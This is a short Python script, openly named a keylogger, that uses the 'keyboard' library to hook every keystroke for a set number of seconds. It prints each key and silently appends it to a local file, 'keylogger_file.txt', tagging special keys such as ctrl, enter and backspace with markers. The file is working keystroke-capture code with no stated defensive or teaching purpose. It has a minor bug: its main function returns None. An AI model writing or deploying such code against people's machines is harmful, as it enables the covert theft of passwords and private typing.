import keyboard
from keyboard import KeyboardEvent
import time


spec_key = {
    key: f'⌠{key}⌡'
    for key in [
        'ctrl', 'shift', 'tab',
        'esc', 'left windows', 'print screen',
        'end', 'delete', 'f1', 'f2', 'f3', 'f4',
        'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'insert', 'down', 'page down',
        'right', 'clear', 'left',
        'home', 'up', 'num lock',
        'backspace', 'enter', 'right shift',
        'page up', 'space', 'alt',
        'caps lock', 'right alt', 'right ctrl',
    ]
}

spec_key['space'] = ' '


def __parse_key_event(event: KeyboardEvent):
    if event.event_type == keyboard.KEY_UP:
        return ""

    res = str(event.name)

    global spec_key
    if res in spec_key:
        res = spec_key[res]

    print(res)
    try:
        with open('keylogger_file.txt', 'a') as f:
            f.write(res)
    except Exception as e:
        print(f"Error to find file: {e}")

    return res


def __key_log(duration):
    logger = []

    keyboard.hook(
        lambda event: logger.append(__parse_key_event(event))
    )

    time.sleep(duration)
    keyboard.unhook_all()


def get_key_log(duration=5):
    duration = int(duration)

    content = __key_log(duration)

    return content


if __name__ == '__main__':
    print(get_key_log(5))
